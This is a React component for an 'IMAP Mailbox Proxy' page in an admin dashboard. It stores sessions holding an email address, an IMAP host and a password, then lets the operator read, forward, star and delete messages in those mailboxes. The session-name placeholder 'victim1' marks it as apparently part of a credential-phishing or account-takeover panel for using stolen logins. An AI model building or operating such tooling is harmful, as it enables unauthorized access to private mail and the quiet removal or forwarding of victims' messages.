import { useEffect, useState } from 'react'
import { useParams, Link } from 'react-router-dom'
import { Inbox, Star, Reply, Trash, Forward, Search, ArrowLeft, Plus, AlertCircle } from 'lucide-react'
import Modal from '../components/Modal'
import { useToast } from '../components/Toast'
import { mailboxApi } from '../lib/api'

export default function Mailbox() {
  const { sessionId } = useParams()
  const toast = useToast()
  const [sessions, setSessions] = useState([])
  const [sessionName, setSessionName] = useState(null)
  const [folders, setFolders] = useState([])
  const [folder, setFolder] = useState('INBOX')
  const [messages, setMessages] = useState([])
  const [search, setSearch] = useState('')
  const [selected, setSelected] = useState(null)
  const [addOpen, setAddOpen] = useState(false)
  const [form, setForm] = useState({ name: '', email: '', imap_host: 'outlook.office365.com', imap_port: 993, password: '', use_ssl: true })

  useEffect(() => {
    mailboxApi.sessions().then(async (s) => {
      setSessions(s)
      if (s.length === 0) { setAddOpen(true); return }
      const first = s[0]; setSessionName(first.name)
      try {
        const f = await mailboxApi.folders(first.name)
        setFolders(f.folders); setFolder('INBOX')
        const m = await mailboxApi.messages(first.name, 'INBOX')
        setMessages(m.messages); setSelected(m.messages[0] || null)
      } catch (e) { toast.error('IMAP connection failed (real server needed for live data)') }
    })
  }, [])

  const load = async (folderName) => {
    setFolder(folderName)
    if (!sessionName) return
    try {
      const m = await mailboxApi.messages(sessionName, folderName)
      setMessages(m.messages); setSelected(m.messages[0] || null)
    } catch { toast.error('Failed to load folder') }
  }

  const addSession = async () => {
    try {
      await mailboxApi.add(form)
      setSessions((s) => [...s, form])
      setSessionName(form.name); setForm({ ...form, name: '', email: '', password: '' })
      setAddOpen(false)
      toast.success('Mailbox session saved (backend)')
    } catch { toast.error('Could not save session'); }
  }

  const removeSession = async (name) => {
    try { await mailboxApi.remove(name); setSessions((s) => s.filter((x) => x.name !== name)); if (sessionName === name) setSessionName(null) } catch {}
  }

  const deleteMessage = async (id) => {
    try { await mailboxApi.delete(sessionName, id, folder); setMessages((m) => m.filter((x) => x.id !== id)); toast.success('Deleted') } catch {}
  }
  const star = async (id) => { try { await mailboxApi.flag(sessionName, id, '\\Flagged', folder); toast.success('Starred') } catch {} }
  const forward = async (id) => {
    const to = prompt('Forward to email:')
    if (!to) return
    try { await mailboxApi.forward(sessionName, { to, msg_id: id, folder }); toast.success('Forwarded') } catch {}
  }

  const filtered = messages.filter((m) => (m.subject || '').toLowerCase().includes(search.toLowerCase()))

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <Link to="/admin/dashboard" className="text-gray-400 hover:text-white"><ArrowLeft size={18} /></Link>
          <h2 className="text-xl font-semibold text-white">IMAP Mailbox Proxy</h2>
        </div>
        <div className="flex gap-2 items-center">
          <select value={sessionName || ''} onChange={(e) => setSessionName(e.target.value)} className="text-sm">
            {sessions.map((s) => <option key={s.name} value={s.name}>{s.email}</option>)}
          </select>
          <button onClick={() => setAddOpen(true)} className="px-3 py-1.5 rounded-lg bg-accent/15 text-accent text-xs flex items-center gap-1"><Plus size={12} />Add Mailbox</button>
          {sessionName && (
            <button onClick={() => removeSession(sessionName)} className="px-3 py-1.5 rounded-lg bg-danger/15 text-danger text-xs">Remove</button>
          )}
        </div>
      </div>
      <div className="flex gap-4 h-[calc(100vh-12rem)]">
        <aside className="w-48 glass rounded-2xl border border-white/10 p-3 overflow-y-auto">
          <h3 className="text-xs uppercase text-gray-400 tracking-wider px-2 mb-2">Folders</h3>
          {folders.length === 0 ? (
            <div className="text-xs text-gray-500 px-2">No folders yet</div>
          ) : folders.map((f) => (
            <button key={f} onClick={() => load(f)}
              className={`w-full text-left px-3 py-2 rounded-lg text-sm transition ${folder === f ? 'bg-accent/15 text-accent' : 'text-gray-300 hover:bg-white/5'}`}>
              <Inbox size={14} className="inline mr-2" />{f}
            </button>
          ))}
        </aside>
        <aside className="w-80 glass rounded-2xl border border-white/10 flex flex-col">
          <div className="p-3 border-b border-white/5 flex items-center gap-2">
            <Search size={14} className="text-gray-400" />
            <input value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search mail..." className="w-full text-sm py-2" />
          </div>
          <div className="flex-1 overflow-y-auto p-2">
            {filtered.length === 0 ? (
              <div className="text-center text-gray-500 py-6 text-sm">
                <AlertCircle size={20} className="mx-auto mb-2 text-gray-400" />
                No messages
              </div>
            ) : filtered.map((m) => (
              <button key={m.id} onClick={() => setSelected(m)}
                className={`w-full text-left p-3 rounded-xl mb-1 transition ${selected?.id === m.id ? 'bg-accent/15 border border-accent/30' : 'hover:bg-white/5 border border-transparent'}`}>
                <div className="text-sm text-white font-medium truncate">{m.subject || '(no subject)'}</div>
                <div className="text-xs text-gray-400 truncate">{m.from}</div>
                <div className="text-[11px] text-accent mt-1">{m.date}</div>
              </button>
            ))}
          </div>
        </aside>
        <div className="flex-1 glass rounded-2xl border border-white/10 flex flex-col">
          {selected ? (
            <>
              <div className="p-4 border-b border-white/5 flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <Inbox size={18} className="text-accent" />
                  <h3 className="text-lg font-semibold text-white truncate">{selected.subject || '(no subject)'}</h3>
                </div>
                <div className="flex items-center gap-2">
                  <button onClick={() => star(selected.id)} className="w-9 h-9 rounded-lg bg-white/5 hover:bg-white/10 flex items-center justify-center text-gray-300"><Star size={16} /></button>
                  <button onClick={() => forward(selected.id)} className="w-9 h-9 rounded-lg bg-white/5 hover:bg-white/10 flex items-center justify-center text-gray-300"><Forward size={16} /></button>
                  <button onClick={() => deleteMessage(selected.id)} className="w-9 h-9 rounded-lg bg-danger/15 hover:bg-danger/25 flex items-center justify-center text-danger"><Trash size={16} /></button>
                </div>
              </div>
              <div className="p-6 overflow-y-auto flex-1">
                <div className="text-sm text-gray-400 mb-1">From: <span className="text-white">{selected.from}</span></div>
                <div className="text-xs text-gray-500 mb-4">{selected.date}</div>
                <div className="text-gray-200 leading-relaxed whitespace-pre-wrap">{selected.body || '(empty)'}</div>
              </div>
            </>
          ) : (
            <div className="flex-1 flex items-center justify-center text-gray-500">Select a message</div>
          )}
        </div>
      </div>
      <Modal open={addOpen} onClose={() => setAddOpen(false)} title="Add Mailbox Session" size="md"
        footer={<>
          <button onClick={() => setAddOpen(false)} className="px-4 py-2 rounded-lg bg-white/5 hover:bg-white/10 text-sm text-gray-300">Cancel</button>
          <button onClick={addSession} className="px-4 py-2 rounded-lg bg-accent hover:brightness-110 text-sm text-white shadow-glow">Save Session</button>
        </>}>
        <div className="space-y-3">
          <div><label className="block text-xs text-gray-400 mb-1">Session Name</label><input value={form.name} onChange={(e) => setForm({ ...form, name: e.target.value })} placeholder="victim1" /></div>
          <div><label className="block text-xs text-gray-400 mb-1">Email</label><input value={form.email} onChange={(e) => setForm({ ...form, email: e.target.value })} placeholder="[email protected]" /></div>
          <div className="grid grid-cols-2 gap-3">
            <div><label className="block text-xs text-gray-400 mb-1">IMAP Host</label><input value={form.imap_host} onChange={(e) => setForm({ ...form, imap_host: e.target.value })} /></div>
            <div><label className="block text-xs text-gray-400 mb-1">IMAP Port</label><input value={form.imap_port} onChange={(e) => setForm({ ...form, imap_port: parseInt(e.target.value) || 993 })} /></div>
          </div>
          <div><label className="block text-xs text-gray-400 mb-1">Password / App Password</label><input type="password" value={form.password} onChange={(e) => setForm({ ...form, password: e.target.value })} placeholder="••••••••" /></div>
          <label className="flex items-center gap-2 text-sm text-gray-300"><input type="checkbox" checked={form.use_ssl} onChange={(e) => setForm({ ...form, use_ssl: e.target.checked })} style={{ accentColor: '#3498db' }} />Use SSL</label>
        </div>
      </Modal>
    </div>
  )
}
